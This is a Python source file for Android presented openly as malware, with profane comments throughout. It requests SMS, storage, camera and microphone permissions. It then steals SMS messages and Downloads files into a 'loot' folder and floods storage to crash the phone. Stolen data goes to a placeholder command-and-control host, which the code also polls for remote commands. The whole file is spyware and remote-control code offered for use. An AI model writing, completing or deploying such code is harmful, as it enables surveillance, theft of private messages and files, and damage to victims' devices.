import os
import socket
import threading
import time
import base64
import sqlite3
import shutil
from datetime import datetime
from android.permissions import request_permissions, Permission

# Evil server to send stolen data
C2_SERVER ="http://your-evil-server.com/command"
# Local directory to store stolen data
LOOT_DIR ="/sdcard/evil_loot"
# File to log commands and data
LOG_FILE = f"{LOOT_DIR}/loot.log"

def request_evil_permissions():
    """Grab all the fucking permissions we need."""
    permissions = [
        Permission.READ_SMS,
        Permission.READ_EXTERNAL_STORAGE,
        Permission.WRITE_EXTERNAL_STORAGE,
        Permission.CAMERA,
        Permission.RECORD_AUDIO]    request_permissions(permissions)

def setup_loot_dir():
    """Create a directory to stash the stolen shit."""
    if not os.path.exists(LOOT_DIR):
        os.makedirs(LOOT_DIR)
    with open(LOG_FILE,"a") as f:
        f.write(f"[*] Started at {datetime.now()}\n")

def steal_sms():
    """Rip off all SMS messages like a sneaky bastard."""
    try:
        conn = sqlite3.connect("/data/data/com.android.providers.telephony/databases/mmssms.db")
        cursor = conn.cursor()
        cursor.execute("SELECT address, body, date FROM sms")
        sms_data = cursor.fetchall()
        with open(f"{LOOT_DIR}/sms_loot.txt","a") as f:
            for sms in sms_data:
                f.write(f"From: {sms[0]} | Message: {sms[1]} | Date: {sms[2]}\n")
        conn.close()
    except Exception as e:
        with open(LOG_FILE,"a") as f:
            f.write(f"[!] SMS steal failed: {e}\n")

def steal_files():
    """Snag all files from the Downloads folder."""
    try:
        download_dir ="/sdcard/Download"
        for root,_, files in os.walk(download_dir):
            for file in files:
                file_path = os.path.join(root, file)
                shutil.copy(file_path, f"{LOOT_DIR}/{file}")
                with open(LOG_FILE,"a") as f:
                    f.write(f"[*] Stole file: {file}\n")
    except Exception as e:
        with open(LOG_FILE,"a") as f:
            f.write(f"[!] File steal failed: {e}\n")

def crash_phone():
    """Fuck up the phone by overloading it."""
    try:
        while True:
            with open(f"/sdcard/evil_{time.time()}.txt","wb") as f:
                f.write(os.urandom(1024* 1024* 10))  # Write 10MB of random data
    except Exception as e:
        with open(LOG_FILE,"a") as f:
            f.write(f"[!] Crash attempt failed: {e}\n")

def send_to_c2(data):
    """Send stolen shit to your C2 server."""
    try:
        import requests
        requests.post(C2_SERVER, json={"data": base64.b64encode(data.encode()).decode()})
    except Exception as e:
        with open(LOG_FILE,"a") as f:
            f.write(f"[!] C2 send failed: {e}\n")

def command_listener():
    """Listen for commands from your C2 server."""
    while True:
        try:
            import requests
            response = requests.get(C2_SERVER).json()
            command = response.get("command")
            if command =="steal_sms":
                steal_sms()
            elif command =="steal_files":
                steal_files()
            elif command =="crash":
                crash_phone()
            elif command =="send_logs":
                with open(LOG_FILE,"r") as f:
                    send_to_c2(f.read())
        except Exception as e:
            with open(LOG_FILE,"a") as f:
                f.write(f"[!] Command listener error: {e}\n")
        time.sleep(10)

def main():
    """Kick off the fucking mobile hack."""
    request_evil_permissions()
    setup_loot_dir()

    # Start command listener in a separate thread
    listener_thread = threading.Thread(target=command_listener)
    listener_thread.daemon = True
    listener_thread.start()

    # Keep the script running
    while True:
        time.sleep(1)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        with open(LOG_FILE,"a") as f:
            f.write(f"[!] Main error: {e}\n")
